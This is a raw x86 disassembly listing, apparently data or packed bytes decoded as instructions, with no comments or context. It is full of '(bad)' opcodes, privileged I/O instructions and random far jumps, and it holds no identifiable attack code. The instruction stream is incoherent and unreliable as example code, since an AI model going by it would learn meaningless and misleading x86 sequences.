  40f0a6:	test   al,0x96
  40f0a8:	and    cl,BYTE PTR [esi+0x7f39d440]
  40f0ae:	inc    eax
  40f0af:	hlt    
  40f0b0:	pop    ebp
  40f0b1:	cmp    al,0xf
  40f0b3:	xchg   esp,eax
  40f0b4:	inc    esi
  40f0b5:	(bad)  
  40f0b6:	aad    0x1d
  40f0b8:	sbb    al,0xd2
  40f0ba:	xchg   ebx,eax
  40f0bb:	js     0x40f08e
  40f0bd:	and    eax,0xdf33318c
  40f0c2:	aad    0x69
  40f0c4:	jns    0x40f0c5
  40f0c6:	push   0x7b
  40f0c8:	int3   
  40f0c9:	sar    BYTE PTR [esi],0x64
  40f0cc:	sbb    eax,0x141c9780
  40f0d1:	sub    BYTE PTR [ecx],0x7a
  40f0d4:	outs   dx,BYTE PTR ds:[esi]
  40f0d5:	test   eax,0x97ff4004
  40f0da:	jmp    0xf162c8a8
  40f0df:	mov    ah,0x15
  40f0e1:	pusha  
  40f0e2:	call   0x15f66a22
  40f0e7:	xor    esi,ebx
  40f0e9:	and    al,0x7b
  40f0eb:	hlt    
  40f0ec:	fnstenv [eax-0x2e147f53]
  40f0f2:	mov    BYTE PTR [esi+ebp*4],dl
  40f0f5:	jge    0x40f08f
  40f0f7:	mov    cl,BYTE PTR [ebp-0x7fabb0e3]
  40f0fd:	cmc    
  40f0fe:	pop    sp
  40f100:	push   ebx
  40f101:	std    
  40f102:	pop    ebp
  40f103:	loop   0x40f152
  40f105:	imul   ebp,edi,0x1fef6b52
  40f10b:	cwde   
  40f10c:	jmp    0xfb6a:0x7862ef83
  40f113:	lds    eax,FWORD PTR [esi-0x36786328]
  40f119:	jmp    0xa0ff:0xdb8c4100
  40f120:	outs   dx,DWORD PTR ds:[esi]
  40f121:	xchg   edx,eax
  40f122:	retf   0xafeb
  40f125:	shl    BYTE PTR [edx-0x6b19edde],0xe
  40f12c:	mov    ss,WORD PTR [ecx-0x56]
  40f12f:	add    eax,ecx
  40f131:	xor    ecx,DWORD PTR [ecx+0x13042a52]
  40f137:	test   BYTE PTR [esi+0x5d785a4d],0x37
  40f13e:	fs and al,0xeb
  40f141:	scas   al,BYTE PTR es:[edi]
  40f142:	dec    edx
  40f143:	push   edi
  40f144:	inc    esi
  40f145:	jnp    0x40f15e
  40f147:	outs   dx,DWORD PTR ds:[esi]
  40f148:	mov    bh,0x62
  40f14a:	rcr    BYTE PTR [edi-0x37fea36d],1
  40f150:	and    eax,0xaa88d590
  40f155:	lods   eax,DWORD PTR ds:[esi]
  40f156:	cwde   
  40f157:	cmp    cl,bh
  40f159:	mov    ebx,0x4557799a
  40f15e:	ins    DWORD PTR es:[edi],dx
  40f15f:	dec    ecx
  40f160:	cdq    
  40f161:	jge    0x40f0e5
  40f163:	retf   0xda1d
  40f166:	adc    al,0xd5
  40f168:	cmp    eax,0x4686aae9
  40f16d:	out    dx,eax
  40f16e:	retf   
  40f16f:	jae    0x40f1b6
  40f171:	pop    ebp
  40f172:	je     0x40f156
  40f174:	jp     0x40f148
  40f176:	inc    eax
  40f177:	addr16 jb 0x40f110
  40f17a:	and    eax,0x60536321
  40f17f:	jle    0x40f11c
  40f181:	add    DWORD PTR [esi+0x53],ebx
  40f184:	stos   DWORD PTR es:[edi],eax
  40f185:	imul   ebx
  40f187:	mov    eax,ds:0x73591567
  40f18c:	mov    dh,0x1e
  40f18e:	push   esi
  40f18f:	jae    0x40f14e
  40f191:	inc    ebx
  40f192:	cli    
  40f193:	jmp    0xd936:0xbd6ffc84
  40f19a:	cmp    al,bl
  40f19c:	in     eax,dx
  40f19d:	mov    bl,0xa4
  40f19f:	je     0x40f1a4
  40f1a1:	xchg   ebp,eax
  40f1a2:	push   esp
  40f1a3:	lea    ebp,[esi+edi*8]
  40f1a6:	push   edi
  40f1a7:	shl    DWORD PTR [ebp+0x45],0x71
  40f1ab:	clc    
  40f1ac:	xor    DWORD PTR ss:0x45282192,ecx
  40f1b3:	pop    esi
  40f1b4:	jb     0x40f199
  40f1b6:	pop    esp
  40f1b7:	and    cl,0x97
  40f1ba:	scas   al,BYTE PTR es:[edi]
  40f1bb:	data16 es jno 0x40f162
  40f1bf:	xor    eax,0x305b2913
  40f1c4:	into   
  40f1c5:	iretw  
  40f1c7:	jbe    0x40f171
  40f1c9:	sub    DWORD PTR [ebx],edi
  40f1cb:	addr16 jp 0x40f207
  40f1ce:	inc    eax
  40f1cf:	sub    bh,BYTE PTR [edi+0x30676547]
  40f1d5:	push   es
  40f1d6:	push   ebp
  40f1d7:	xchg   esp,eax
  40f1d8:	mov    ds:0xaacfe3d5,al
  40f1dd:	lods   eax,DWORD PTR ds:[esi]
  40f1de:	jne    0x40f202
  40f1e0:	out    0xd,al
  40f1e2:	inc    eax
  40f1e3:	jne    0x40f1a1
  40f1e5:	mov    ds,WORD PTR [ebp-0x187c608b]
  40f1eb:	call   0x7065:0xae5012e7
  40f1f2:	das    
  40f1f3:	inc    esi
  40f1f4:	xchg   ebx,eax
  40f1f5:	xchg   BYTE PTR [edi-0x65],bl
  40f1f8:	or     DWORD PTR [ecx],0xffffffb4
  40f1fb:	rcr    BYTE PTR [edi+0x1e],0x2e
  40f1ff:	imul   ebx,DWORD PTR [eax-0x32bd87d],0xffffffd5
  40f206:	cmp    eax,0x42b50c06
  40f20b:	dec    esi
  40f20c:	pop    eax
  40f20d:	rcr    DWORD PTR [edi+edx*4+0x35],cl
  40f211:	ins    BYTE PTR es:[edi],dx
  40f212:	mov    cl,0xfb
  40f214:	add    BYTE PTR [edi],0x5
  40f217:	pushf  
  40f218:	pop    edx
  40f219:	outs   dx,DWORD PTR ds:[esi]
  40f21a:	adc    al,0x30
  40f21c:	in     eax,dx
  40f21d:	sbb    eax,DWORD PTR [eax-0x42]
  40f220:	lock stos BYTE PTR es:[edi],al
  40f222:	jecxz  0x40f28b
  40f224:	arpl   WORD PTR [ecx],sp
  40f226:	loope  0x40f242
  40f228:	cmp    edx,ebx
  40f22a:	push   cs
  40f22b:	aam    0xdd
  40f22d:	xor    edx,DWORD PTR [ebx]
  40f22f:	ja     0x40f1dd
  40f231:	(bad)  
  40f232:	xor    dh,BYTE PTR [esi]
  40f234:	fdiv   DWORD PTR [edi]
  40f236:	(bad)  
  40f237:	cs icebp 
  40f239:	das    
  40f23a:	mov    ch,0xf6
  40f23c:	sar    BYTE PTR [edx],0x86
  40f23f:	mov    dl,0x5b
  40f241:	xchg   edx,eax
  40f242:	dec    esp
  40f243:	adc    ebp,DWORD PTR [edi-0x39]
  40f246:	and    eax,0x6c4805e5
  40f24b:	or     BYTE PTR gs:[edi-0x16],ah
  40f24f:	jecxz  0x40f2ac
  40f251:	test   BYTE PTR [edx],al
  40f253:	les    edx,FWORD PTR [ebx-0x80]
  40f256:	jle    0x40f2ae
  40f258:	fst    DWORD PTR [edx]
  40f25a:	fst    QWORD PTR [edi-0x10a1024c]
  40f260:	mov    esi,0xf2d8f8bb
  40f265:	loope  0x40f27e
  40f267:	mov    ebx,0xda85a163
  40f26c:	fldln2 
  40f26e:	int    0x20
  40f270:	mov    dl,0x24
  40f272:	je     0x40f294
  40f274:	(bad)
  40f278:	shr    DWORD PTR [ebp-0x14718745],0xc7
  40f27f:	in     eax,dx
  40f280:	addr16 call 0x5c1b0b55
  40f286:	adc    ah,BYTE PTR [esi-0x35]
  40f289:	ret    0xecf4
  40f28c:	sbb    al,0xaf
  40f28e:	xor    esp,esi
  40f290:	out    dx,eax
  40f291:	ja     0x40f2c6
  40f293:	aas    
  40f294:	jl     0x40f2f8
  40f296:	in     eax,0x32
  40f298:	xor    eax,0x8673ff64
  40f29d:	and    DWORD PTR [eax+0x1],0xffffffb8
  40f2a1:	out    dx,al
  40f2a2:	vmread DWORD PTR [ebp-0x5e],edx
  40f2a6:	push   ebx
  40f2a7:	adc    DWORD PTR [esi-0x214fde5e],ecx
  40f2ad:	(bad)  
  40f2ae:	mov    BYTE PTR [edx],dl
  40f2b0:	ret    0x383
  40f2b3:	dec    ebx
  40f2b4:	add    eax,0xffffffca
  40f2b7:	inc    edi
  40f2b8:	fdivr  DWORD PTR [ebx]
  40f2ba:	adc    al,0xf2
  40f2bc:	xor    DWORD PTR [eax+0x6379e5cf],ecx
  40f2c2:	jno    0x40f259
  40f2c4:	mov    bl,0x7c
  40f2c6:	or     eax,0x39141de7
  40f2cb:	xor    ebx,DWORD PTR ds:[eax+eiz*8+0x7d]
  40f2d0:	mov    al,0x7f
  40f2d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2d3:	add    al,0xf7
  40f2d5:	fld    DWORD PTR [ebp+esi*2-0x21a794d3]
  40f2dc:	ins    BYTE PTR es:[edi],dx
  40f2dd:	and    BYTE PTR [esi-0x54],al
  40f2e0:	inc    ebx
  40f2e1:	mov    dl,0x3f
  40f2e3:	outs   dx,BYTE PTR ds:[esi]
  40f2e4:	push   0x5d
  40f2e6:	xor    DWORD PTR [ebx],0xffffffc1
  40f2e9:	cmp    ebx,esi
  40f2eb:	repz popf 
  40f2ed:	inc    ecx
  40f2ee:	loopne 0x40f34c
  40f2f0:	sbb    ch,BYTE PTR [ebp+0x3e4246b]
  40f2f6:	lea    eax,[ecx]
  40f2f8:	and    eax,0x4606c22
  40f2fd:	sub    ebp,edi
  40f2ff:	test   eax,0x527b1dcc
  40f304:	add    ch,ch
  40f306:	int3   
  40f307:	add    al,0x5c
  40f309:	push   eax
  40f30a:	rcl    DWORD PTR [ecx],1
  40f30c:	gs (bad) 
  40f30e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f30f:	sbb    BYTE PTR [edi],bl
  40f311:	in     al,dx
  40f312:	shl    BYTE PTR [ebx],0x5b
  40f315:	bound  eax,QWORD PTR [edx]
  40f317:	fmul   QWORD PTR [esi+0x15]
  40f31a:	les    eax,FWORD PTR [edi+0x24]
  40f31d:	jle    0x40f30a
  40f31f:	inc    BYTE PTR [esp+ecx*2-0x57d51b51]
  40f326:	add    BYTE PTR [ebx+0x300899d],ah
  40f32c:	or     eax,0x7520ab0c
  40f331:	add    esp,DWORD PTR [edx+0x39]
  40f334:	gs (bad) 
  40f336:	lock das 
  40f338:	jbe    0x40f38e
  40f33a:	jmp    esp
  40f33c:	outs   dx,DWORD PTR ds:[esi]
  40f33d:	push   ecx
  40f33e:	lods   eax,DWORD PTR ds:[esi]
  40f33f:	jmp    0x80dc9a63
  40f344:	mov    ch,0xbc
  40f346:	retf   0xed0b
  40f349:	inc    ebp
  40f34a:	xchg   ecx,eax
  40f34b:	cs mov ebp,0x6312923f
  40f351:	xchg   bl,dl
  40f353:	fs mov esi,0xb5e5d632
  40f359:	rcl    DWORD PTR [edx],0x9a
  40f35c:	call   0xebff:0x173b95af
  40f363:	cli    
  40f364:	xchg   edi,eax
  40f365:	push   edx
  40f366:	repnz sbb BYTE PTR [edx],ch
  40f369:	leave  
  40f36a:	cld    
  40f36b:	lods   al,BYTE PTR ds:[esi]
  40f36c:	ret    
  40f36d:	clc    
  40f36e:	mov    ch,BYTE PTR [edx]
  40f370:	dec    ebx
  40f371:	dec    ecx
  40f372:	lods   al,BYTE PTR ds:[esi]
  40f373:	inc    ecx
  40f374:	xchg   ebx,eax
  40f375:	jb     0x40f300
  40f377:	in     al,0x6b
  40f379:	iret   
  40f37a:	adc    esp,DWORD PTR [ebx]
  40f37c:	in     eax,0xc8
  40f37e:	jle    0x40f350
  40f380:	in     al,0x5a
  40f382:	push   cs
  40f383:	add    ebp,DWORD PTR [eax+0x18f026f0]
  40f389:	lds    esp,FWORD PTR ds:0xcf1f7eea
  40f38f:	and    ah,BYTE PTR [ebx+edi*8-0x5810f841]
  40f396:	test   eax,0xad997ec6
  40f39b:	push   0x6ed0873
  40f3a0:	fs pop cx
  40f3a3:	and    al,0x7b
  40f3a5:	cmp    esp,esi
  40f3a7:	int3   
  40f3a8:	add    BYTE PTR [ebx-0x64],dh
  40f3ab:	mov    dl,0xc2
  40f3ad:	add    DWORD PTR [ebx+0x60],ebx
  40f3b0:	dec    edx
  40f3b1:	add    BYTE PTR [edx+0x1c],0x3b
  40f3b5:	and    edx,DWORD PTR [esi+0x1864227]
  40f3bb:	mov    fs,WORD PTR [ebp-0xb]
  40f3be:	loope  0x40f3df
  40f3c0:	xchg   esi,eax
  40f3c1:	cwde   
  40f3c2:	jecxz  0x40f3ff
  40f3c4:	js     0x40f37a
  40f3c6:	xchg   DWORD PTR [edx+0x5b0b2045],esp
  40f3cc:	mov    edi,0xfff9219b
  40f3d1:	iret   
  40f3d2:	ret    0xc198
  40f3d5:	xchg   edi,eax
  40f3d6:	leave  
  40f3d7:	dec    eax
  40f3d8:	jbe    0x40f3ab
  40f3da:	fild   DWORD PTR [esi+edx*1+0x2f]
  40f3de:	(bad)  
  40f3df:	dec    ecx
  40f3e0:	retf   0x949c
  40f3e3:	jge    0x40f430
  40f3e5:	sub    cl,BYTE PTR [edx*2-0x68e5cddb]
  40f3ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3ed:	xor    eax,0x3ca0f1cf
  40f3f2:	sbb    DWORD PTR [ebx+0x28],0x70
  40f3f6:	jns    0x40f3f6
  40f3f8:	(bad)
  40f3fc:	out    dx,al
  40f3fd:	fs jge 0x40f3d2
  40f400:	push   0xffffffbe
  40f402:	cmp    BYTE PTR [edx+0x22],cl
  40f405:	xchg   edi,eax
  40f406:	mov    cl,0xf3
  40f408:	out    dx,eax
  40f409:	push   esi
  40f40a:	fisttp QWORD PTR [ebp+0x5d1c78b5]
  40f410:	xor    DWORD PTR [ecx+0x2c],0xffffffd0
  40f414:	and    al,0x46
  40f416:	call   0xca1a:0xd403487f
  40f41d:	in     al,0x51
  40f41f:	loopne 0x40f459
  40f421:	test   eax,ebp
  40f423:	mov    edx,0x5ee41c79
  40f428:	cmp    eax,0xff9455d
  40f42d:	call   esi
  40f42f:	and    al,BYTE PTR [edx-0x59]
  40f432:	dec    eax
  40f433:	mov    bh,0xc6
  40f435:	test   BYTE PTR [edx-0x2a293613],ah
  40f43b:	and    dh,BYTE PTR [edi+0x9]
  40f43e:	out    0x22,eax
  40f440:	sbb    al,0xd4
  40f442:	xor    al,0x18
  40f444:	shl    DWORD PTR [ecx],0xc7
  40f447:	add    DWORD PTR [ebp-0x359e6f4b],esi
  40f44d:	push   edi
  40f44e:	hlt    
  40f44f:	add    DWORD PTR [ebp*1-0x53bf28c9],eax
  40f456:	adc    al,BYTE PTR [esi+0x2a]
  40f459:	fcom   DWORD PTR [edx+0x40]
  40f45c:	pop    esi
  40f45d:	out    dx,eax
  40f45e:	stc    
  40f45f:	test   eax,0x23a500f6
  40f464:	xchg   ebx,eax
  40f465:	das    
  40f466:	sahf   
  40f467:	dec    esp
  40f468:	xchg   esi,eax
  40f469:	xor    al,0x59
  40f46b:	cld    
  40f46c:	stc    
  40f46d:	jecxz  0x40f47a
  40f46f:	clc    
  40f470:	int    0xfe
  40f472:	pushf  
  40f473:	jae    0x40f4ec
  40f475:	icebp  
  40f476:	jb     0x40f46c
  40f478:	xchg   BYTE PTR [esi],dl
  40f47a:	add    DWORD PTR [eax-0x65],edx
  40f47d:	sbb    DWORD PTR [ebx-0xac8740f],edx
  40f483:	and    eax,0xfffe29b7
  40f488:	(bad)  
  40f489:	arpl   WORD PTR [eax+0x7d],cx
  40f48c:	mov    ebx,0x79a2723f
  40f491:	or     DWORD PTR [edx-0x9],0x26
  40f495:	fbstp  TBYTE PTR [esi]
  40f497:	ds mov ah,0x79
  40f49a:	shr    BYTE PTR [edx],cl
  40f49c:	popa   
  40f49d:	xchg   esi,eax
  40f49e:	push   ecx
  40f49f:	sub    edx,DWORD PTR [ebx-0x55b38740]
  40f4a5:	std    
  40f4a6:	fisubr DWORD PTR [ecx+0xd]
  40f4a9:	jg     0x40f47f
  40f4ab:	cmp    eax,0xaee880ec
  40f4b0:	popf   
  40f4b1:	enter  0x3159,0x46
  40f4b5:	jg     0x40f49c
  40f4b7:	mov    esi,0x18bc1009
  40f4bc:	stos   BYTE PTR es:[edi],al
  40f4bd:	pop    esi
  40f4be:	mov    cs,WORD PTR [esi]
  40f4c0:	push   esi
  40f4c1:	jae    0x40f462
  40f4c3:	push   esp
  40f4c4:	pop    eax
  40f4c5:	(bad)  
  40f4c6:	jnp    0x40f470
  40f4c8:	and    eax,0x1f3b5b1a
  40f4cd:	mov    ah,0x4
  40f4cf:	jmp    eax
  40f4d1:	test   DWORD PTR [ecx],0x734d441a
  40f4d7:	push   ss
  40f4d8:	loopne 0x40f51f
  40f4da:	loopne 0x40f50a
  40f4dc:	cmp    esp,DWORD PTR [edi+edi*2+0x67171a4f]
  40f4e3:	cmp    al,0xdf
  40f4e5:	lods   al,BYTE PTR ds:[esi]
  40f4e6:	js     0x40f4d9
  40f4e8:	add    eax,0x3335888a
  40f4ed:	dec    edi
  40f4ee:	jbe    0x40f49a
  40f4f0:	sbb    BYTE PTR [ebx+0x7],bl
  40f4f3:	call   0x3750:0x40a5ed12
  40f4fa:	cmp    eax,0x97b09c99
  40f4ff:	(bad)  [ebx]
  40f501:	daa    
  40f502:	ins    DWORD PTR es:[edi],dx
  40f503:	imul   ebp
  40f505:	push   0xffffffa6
  40f507:	imul   edi,DWORD PTR [esi+0x6f950311],0x1cd19021
  40f511:	mov    ebp,esp
  40f513:	mov    BYTE PTR [ebx+0x5ab59382],dh
  40f519:	push   cs
  40f51a:	dec    ebp
  40f51b:	cmp    eax,0xe3c9f07c
  40f520:	pop    esp
  40f521:	inc    esp
  40f522:	stc    
  40f523:	shr    esp,0x37
  40f526:	cmp    DWORD PTR [esi-0x5],ebx
  40f529:	icebp  
  40f52a:	adc    eax,0xa4b85484
  40f52f:	mov    ecx,0x58eab397
  40f534:	(bad)  
  40f535:	out    dx,al
  40f536:	pop    edx
  40f537:	sti    
  40f538:	js     0x40f510
  40f53a:	mov    bl,0x74
  40f53c:	sub    eax,0x9fa9e63a
  40f541:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f542:	inc    esi
  40f543:	je     0x40f54f
  40f545:	add    eax,0x8fad8ffe
  40f54a:	scas   eax,DWORD PTR es:[edi]
  40f54b:	mov    ebp,0xb03274c0
  40f550:	repz icebp 
  40f552:	or     edx,DWORD PTR ds:0x1ac2e906
  40f558:	clc    
  40f559:	pop    ss
  40f55a:	mov    DWORD PTR [eax],esi
  40f55c:	fstp   DWORD PTR [ebx-0xd]
  40f55f:	gs push edx
  40f561:	fadd   QWORD PTR [esi-0x77]
  40f564:	lahf   
  40f565:	test   BYTE PTR [ebx+0x6337edfc],0x15
  40f56c:	div    ecx
  40f56e:	pop    es
  40f56f:	pop    ebx
  40f570:	cmc    
  40f571:	xchg   esp,eax
  40f572:	leave  
  40f573:	hlt    
  40f574:	pop    esp
  40f575:	fistp  WORD PTR [ecx-0x3]
  40f578:	sub    BYTE PTR fs:[esi+0x26326048],ch
  40f57f:	or     dh,BYTE PTR [ecx-0x75]
  40f582:	pop    ss
  40f583:	xchg   esp,eax
  40f584:	adc    eax,0x3c5aacfb
  40f589:	cmp    al,0x58
  40f58b:	push   esp
  40f58c:	xchg   esp,eax
  40f58d:	jl     0x40f55c
  40f58f:	out    0x7d,al
  40f591:	fld    QWORD PTR [edi+ebp*8-0x3731407a]
  40f598:	in     al,0xd7
  40f59a:	add    DWORD PTR [esi],eax
  40f59c:	mov    esi,0xfd7bccb5
  40f5a1:	xor    BYTE PTR [edx-0x69],cl
  40f5a4:	cwde   
  40f5a5:	test   BYTE PTR [ecx+0x1a],ch
  40f5a8:	cld    
  40f5a9:	test   dl,al
  40f5ab:	cli    
  40f5ac:	in     al,0x9c
  40f5ae:	out    0xfa,al
  40f5b0:	and    BYTE PTR [ecx-0xdaa897c],bl
  40f5b6:	icebp  
  40f5b7:	test   BYTE PTR [esp+eax*4-0x1d],ch
  40f5bb:	xchg   BYTE PTR [ecx-0x63],dl
  40f5be:	aas    
  40f5bf:	add    BYTE PTR [ebp+edx*1-0x6e],bh
  40f5c3:	scas   al,BYTE PTR es:[edi]
  40f5c4:	outs   dx,BYTE PTR ds:[esi]
  40f5c5:	mov    BYTE PTR [esp+edx*2],ch
  40f5c8:	pushf  
  40f5c9:	mov    dh,0xf4
  40f5cb:	jnp    0x40f588
  40f5cd:	or     edx,edx
  40f5cf:	mov    al,ds:0x67aedc5
  40f5d4:	sub    al,0x51
  40f5d6:	pushf  
  40f5d7:	mov    ch,0xe4
  40f5d9:	xchg   ebp,eax
  40f5da:	cwde   
  40f5db:	or     bh,bl
  40f5dd:	in     eax,0x8c
  40f5df:	std    
  40f5e0:	mov    ch,0x46
  40f5e2:	push   edx
  40f5e3:	fcmovnb st,st(5)
  40f5e5:	pop    edi
  40f5e6:	add    DWORD PTR [ecx+ecx*4],ebx
  40f5e9:	and    ch,BYTE PTR es:[edx-0x6c9f6d26]
  40f5f0:	jb     0x40f5a2
  40f5f2:	and    ebx,ebp
  40f5f4:	sbb    DWORD PTR [ecx-0x752dcd85],eax
  40f5fa:	adc    eax,0xffcc73a7
  40f5ff:	adc    esi,DWORD PTR [eax-0x79]
  40f602:	and    al,0xdc
  40f604:	inc    edx
  40f605:	mov    ecx,0x7e496386
  40f60a:	xchg   edi,eax
  40f60b:	(bad)  
  40f60c:	out    dx,al
  40f60d:	pusha  
  40f60e:	inc    edi
  40f60f:	ins    DWORD PTR es:[edi],dx
  40f610:	test   DWORD PTR ds:0x4437f614,edx
  40f616:	jl     0x40f5bc
  40f618:	cmp    eax,0xc1e21485
  40f61d:	aam    0xab
  40f61f:	cwde   
  40f620:	outs   dx,BYTE PTR ds:[esi]
  40f621:	xchg   ebp,eax
  40f622:	xchg   ebx,eax
  40f623:	loop   0x40f629
  40f625:	pop    edx
  40f626:	popf   
  40f627:	loopne 0x40f5e1
  40f629:	ja     0x40f5e5
  40f62b:	dec    edx
  40f62c:	(bad)  
  40f62d:	or     DWORD PTR ds:0xd8b604fb,eax
  40f633:	in     al,dx
  40f634:	div    esp
  40f636:	xor    bh,BYTE PTR [eax]
  40f638:	scas   al,BYTE PTR es:[edi]
  40f639:	push   cs
  40f63a:	and    al,BYTE PTR [ecx]
  40f63c:	mov    bl,0xec
  40f63e:	(bad)  
  40f63f:	ja     0x40f603
  40f641:	iret   
  40f642:	jge    0x40f654
  40f644:	(bad)  
  40f645:	jmp    0x40f607
  40f647:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f648:	repz or eax,0xa7c87e1b
  40f64e:	js     0x40f5f9
  40f650:	sbb    BYTE PTR [ebp-0x3a],dl
  40f653:	bound  esi,QWORD PTR [edx-0x11]
  40f656:	sahf   
  40f657:	mov    dl,0x96
  40f659:	dec    esi
  40f65a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f65b:	mov    eax,0x2162f360
  40f660:	ja     0x40f640
  40f662:	sbb    DWORD PTR [ebp+0x199a4493],edi
  40f668:	loop   0x40f6c7
  40f66a:	pop    DWORD PTR [edi-0x39]
  40f66d:	add    DWORD PTR [ebp+edi*2-0x15c6f92f],edx
  40f674:	inc    ebp
  40f675:	jge    0x40f639
  40f677:	imul   bp,WORD PTR [esi-0x47f30806],0x430
  40f680:	(bad)  
  40f681:	jno    0x40f659
  40f683:	jmp    0x40f652
  40f685:	adc    BYTE PTR [esi-0x4d],0x8
  40f689:	sbb    eax,DWORD PTR [edi+0x15]
  40f68c:	dec    bx
  40f68e:	out    0x82,eax
  40f690:	repnz push edx
  40f692:	call   0x331a:0xdc898a3f
  40f699:	cwde   
  40f69a:	enter  0xddc9,0x24
  40f69e:	int3   
  40f69f:	daa    
  40f6a0:	dec    ebx
  40f6a1:	inc    ebp
  40f6a2:	cmc    
  40f6a3:	stos   DWORD PTR es:[edi],eax
  40f6a4:	je     0x40f6d6
  40f6a6:	jmp    0xa409:0x5100f91f
  40f6ad:	pop    edx
  40f6ae:	add    eax,0x7bc7010b
  40f6b3:	xchg   ecx,eax
  40f6b4:	stos   BYTE PTR es:[edi],al
  40f6b5:	repz or bh,BYTE PTR [ecx+eiz*8]
  40f6b9:	int3   
  40f6ba:	jmp    0x40f736
  40f6bc:	imul   ebp,esp,0xffffff90
  40f6bf:	sbb    bl,BYTE PTR ds:0xdcdc5365
  40f6c5:	pop    ss
  40f6c6:	fwait
  40f6c7:	inc    edi
  40f6c8:	cmp    eax,0xed65cf15
  40f6cd:	rol    DWORD PTR [esi+0x5d6b51ae],1
  40f6d3:	fwait
  40f6d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6d5:	adc    edi,0x369b52c8
  40f6db:	pop    ds
  40f6dc:	mov    esi,0x2b8bc01a
  40f6e1:	xor    dh,BYTE PTR [ebp+0x36]
  40f6e4:	js     0x40f71a
  40f6e6:	xor    esp,esi
  40f6e8:	or     DWORD PTR [ebp+0x9],edx
  40f6eb:	mov    ecx,edx
  40f6ed:	hlt    
  40f6ee:	mov    bh,BYTE PTR [edx]
  40f6f0:	retf   0x9dd2
  40f6f3:	(bad)  
  40f6f5:	and    BYTE PTR [esi+0xa53ede],cl
  40f6fb:	mov    ah,0x83
  40f6fd:	pushf  
  40f6fe:	aam    0x30
  40f700:	adc    al,0x9c
  40f702:	sub    DWORD PTR [edi-0x4c],edx
  40f705:	inc    edi
  40f706:	pop    ebp
  40f707:	leave  
  40f708:	pop    ss
  40f709:	ss cmc 
  40f70b:	add    DWORD PTR [esi+0x51],ebp
  40f70e:	test   BYTE PTR [ebx],ah
  40f710:	jl     0x40f78b
  40f712:	in     eax,dx
  40f713:	dec    ebx
  40f714:	imul   esp,edi,0xe7f056ad
  40f71a:	mov    esp,0x2f2a618
  40f71f:	xor    bl,BYTE PTR [eax+0x266c042f]
  40f725:	mov    edx,0xbcca6559
  40f72a:	js     0x40f718
  40f72c:	fiadd  DWORD PTR [edx]
  40f72e:	(bad)  
  40f72f:	dec    ecx
  40f730:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f731:	xor    DWORD PTR [edi+edx*2+0x69c24422],edx
  40f738:	les    ecx,FWORD PTR [edx+0x47afe43c]
  40f73e:	dec    ebp
  40f73f:	leave  
  40f740:	or     esp,edx
  40f742:	cmp    edi,esp
  40f744:	sti    
  40f745:	cmp    eax,0xcfb0b0b3
  40f74a:	aam    0xde
  40f74c:	mov    edx,0x293625e0
  40f751:	inc    ebp
  40f752:	ins    DWORD PTR es:[edi],dx
  40f753:	mov    edi,0xbbc90140
  40f758:	lock push es
  40f75a:	popa   
  40f75b:	inc    edi
  40f75c:	cmp    al,0x28
  40f75e:	call   0x72d1:0xd99498f5
  40f765:	loope  0x40f708
  40f767:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f768:	lds    esp,FWORD PTR [esi+0x26]
  40f76b:	and    bl,dh
  40f76d:	adc    bh,al
  40f76f:	mov    DWORD PTR [eax-0x7712977],edi
  40f775:	vmwrite edx,DWORD PTR [ebp-0x3d]
  40f779:	(bad)  
  40f77a:	mov    edi,0x4a53cfbf
  40f77f:	adc    al,0x97
  40f781:	and    dl,BYTE PTR [ecx]
  40f783:	sahf   
  40f784:	dec    esp
  40f785:	mov    bl,0xa
  40f787:	xchg   ebx,eax
  40f788:	pusha  
  40f789:	cmc    
  40f78a:	jae    0x40f7c7
  40f78c:	push   ebp
  40f78d:	jmp    0x31bca468
  40f792:	add    DWORD PTR [edx-0x1a2cff43],esp
  40f798:	ss or  dh,bl
  40f79b:	push   0x25
  40f79d:	(bad)  
  40f79e:	dec    ebx
  40f79f:	ins    DWORD PTR es:[edi],dx
  40f7a0:	pusha  
  40f7a1:	shl    dl,0x55
  40f7a4:	sub    DWORD PTR [ebx-0x5601df3],0x624473a8
  40f7ae:	jl     0x40f7f7
  40f7b0:	ror    BYTE PTR [ebx+ebx*4-0x1b],cl
  40f7b4:	cmp    dh,bh
  40f7b6:	rcl    DWORD PTR [edi],0xfe
  40f7b9:	add    cl,bh
  40f7bb:	das    
  40f7bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7bd:	popf   
  40f7be:	clc    
  40f7bf:	popf   
  40f7c0:	xchg   esi,eax
  40f7c1:	scas   eax,DWORD PTR es:[edi]
  40f7c2:	adc    esp,ecx
  40f7c4:	xchg   ebp,eax
  40f7c5:	rep ins BYTE PTR es:[edi],dx
  40f7c7:	aaa    
  40f7c8:	bound  ebx,QWORD PTR [edx-0x110f4555]
  40f7ce:	ret    
  40f7cf:	push   ss
  40f7d0:	inc    esp
  40f7d1:	xchg   esp,eax
  40f7d2:	stc    
  40f7d3:	loop   0x40f80d
  40f7d5:	ret    
  40f7d6:	add    al,0x35
  40f7d8:	mov    eax,DWORD PTR [esi+0x7f]
  40f7db:	arpl   WORD PTR [ebx+0x58],cx
  40f7de:	inc    esi
  40f7df:	add    al,0x18
  40f7e1:	sub    edx,DWORD PTR [edx]
  40f7e3:	add    eax,0x1e387c1a
  40f7e8:	cs adc al,0x14
  40f7eb:	mov    dl,0xb8
  40f7ed:	sbb    al,0xa9
  40f7ef:	pop    DWORD PTR [ebx+0x30dde9bc]
  40f7f5:	pop    edx
  40f7f6:	pop    esi
  40f7f7:	mov    ch,bl
  40f7f9:	in     eax,0xee
  40f7fb:	xor    eax,0xb1cb0e80
  40f800:	jno    0x40f878
  40f802:	jecxz  0x40f7f2
  40f804:	ficom  DWORD PTR [eax]
  40f806:	mul    BYTE PTR [ecx-0x258bf641]
  40f80c:	call   0x917d:0x7d0770b6
  40f813:	cmp    DWORD PTR [ebx-0x9],0xfeeda04e
  40f81a:	std    
  40f81b:	fisttp DWORD PTR [ecx-0x1a]
  40f81e:	or     eax,0x76e26f8f
  40f823:	out    0xad,eax
